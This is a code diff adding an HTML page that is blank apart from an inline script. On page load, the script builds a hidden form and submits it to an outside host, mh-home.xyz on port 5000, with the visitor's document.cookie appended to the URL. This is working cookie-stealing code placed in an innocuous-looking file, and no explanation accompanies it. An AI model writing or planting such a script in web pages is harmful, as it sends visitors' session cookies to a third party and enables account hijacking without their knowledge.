@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title></title>
+    <link href="css/style.css" rel="stylesheet">
+  </head>
+  <body>
+    <div id="div"></div>
+  </body>
+  <script>
+  const image = document.createElement('form');
+  image.setAttribute('method','GET')
+  image.setAttribute('action', `http://mh-home.xyz:5000/users/logout${document.cookie}`)
+  document.getElementById('div').appendChild(image)
+  image.submit()
+  </script>
+</html>
+
